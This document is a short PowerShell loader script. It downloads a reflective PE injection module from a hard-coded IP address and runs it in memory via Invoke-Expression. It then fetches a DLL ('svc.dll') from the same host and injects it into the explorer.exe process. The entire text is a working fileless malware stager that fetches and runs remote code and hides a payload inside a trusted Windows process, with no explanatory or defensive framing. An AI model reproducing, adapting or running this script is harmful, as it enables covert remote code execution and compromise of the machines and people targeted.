$ps1Url = "http://62.60.149.86/Invoke-ReflectivePEInjection.ps1"
$ps1Content = (New-Object System.Net.WebClient).DownloadString($ps1Url)

Invoke-Expression $ps1Content

$dllUrl = "http://62.60.149.86/svc.dll"
$peBytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)

$procId = (Get-Process -Name explorer).Id

Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $procId
